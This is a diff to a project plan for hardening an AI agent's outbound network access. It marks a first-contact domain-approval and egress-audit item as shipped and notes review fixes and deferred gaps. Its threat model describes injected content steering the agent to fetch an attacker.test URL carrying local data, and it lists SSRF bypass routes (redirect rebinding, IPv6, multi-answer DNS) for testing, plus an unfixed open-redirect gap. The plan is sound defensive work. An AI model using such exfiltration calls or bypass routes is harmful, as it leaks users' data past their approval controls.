@@ -74,7 +74,11 @@
 - [ ] **6. Adversarial verify (subagent):** try to reach a private IP through `web_fetch`/`web_search` (redirect-chain rebind, IPv6, the SearXNG base, multi-answer DNS) — ground-truth spy on the real backend. Nothing private may connect; local SearXNG base must still work.
 - [ ] **7. Commit:** `fix(egress): route web_fetch + web_search through the pinned transport (close SSRF/TOCTOU, unify the outbound chokepoint)`
 
-### Item 2b — First-contact domain approval + egress audit  *(detailed 2026-07-18 — awaiting go)*
+### Item 2b — First-contact domain approval + egress audit  ✅ **DONE** (`e2e0c61` + review `225bcd5`)
+
+> Shipped: `egress_policy.py` (per-project host-approval registry + `outbound_host`); a domain gate at `agent.py:~1552` reusing the existing `approval_required`/`permissions.registry` flow (no new UI/route); egress-decision + SSRF-block audit. Spec review MEETS_SPEC; quality review NEEDS_FIXES → **F1 fixed** (strict/plan double-gate that falsely "Declined" an approved web_fetch — the sensitive gate now skips a call the domain gate just approved; strict-mode regression test added). **Deferred, documented:** F2 (redirect hops aren't re-gated — an approved host's open redirect can reach an unapproved one; tracked follow-up — thread the project's approved set into `web_fetch`); F3 (registry not workspace-scoped — only matters under `OCD_MULTI_TENANT=1`, which Option A drops). Tests: `test_egress_approval.py` (17). Detailed spec retained below.
+
+<details><summary>Detailed 2b spec (as implemented)</summary>
 
 **Threat.** Injected content drives the agent to `web_fetch("http://attacker.test/?leak=<local data>")`. SSRF pinning (2a) stops it reaching *internal* hosts, but not exfil to a *public* attacker domain. The Claude-Desktop-shaped control: the first time a turn reaches a **new domain**, ask the user (human-in-the-loop), reusing the approval UI we already have.
 
@@ -95,6 +99,8 @@
 - [ ] **6. Commit:** `feat(egress): first-contact domain approval for web_fetch + egress audit trail`
 
 *(No adversarial-verify stage for 2b — it's a HITL/UX control, not a new attack-surface boundary; spec + quality review suffice.)*
+
+</details>
 
 ### Item 2c — Deterministic outbound redaction  *(detailed before we start it)*
 
